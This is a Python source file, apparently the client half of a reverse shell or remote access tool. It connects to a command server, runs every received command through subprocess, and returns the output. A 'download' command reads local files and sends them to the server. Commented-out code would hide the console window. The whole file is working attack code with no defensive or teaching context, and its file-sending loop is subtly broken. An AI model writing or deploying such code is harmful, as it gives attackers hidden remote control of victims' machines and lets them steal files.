# -*- coding: utf-8 -*-
"""
Created on Sat Jun 12 00:50:58 2021

@author: Musya
"""

import socket
import os
import subprocess

#import hide
#hide.hide_console()
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 6900
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()

# connect to the server
try:
    s.connect((SERVER_HOST, SERVER_PORT))
    cwd = os.getcwd()
    s.send(cwd.encode())
except:
    pass
try:  
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "kill":
            # if the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError:
                # if there is an error, set as the output
                print("File not found")
            else:
                # if operation is successful, empty message
                output = ""
        if 'download' in command:
            output = subprocess.getoutput(command)

            grab, path = command.split('*')
            try:
                print("got path")
                f = open(path, 'rb')
                i = f.read(1024)
                print("read path")
                while i:
                    print("SENDING...")
                    s.send(b'START')
                    s.send(i)
                    i = f.read()
                    f.close()
                    s.send('COMPLETE'.encode())
                    print("DONE...")
            except Exception as e:
                print (e)
            
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
except Exception as e:
    print (e)
    
# close client connection
s.close()
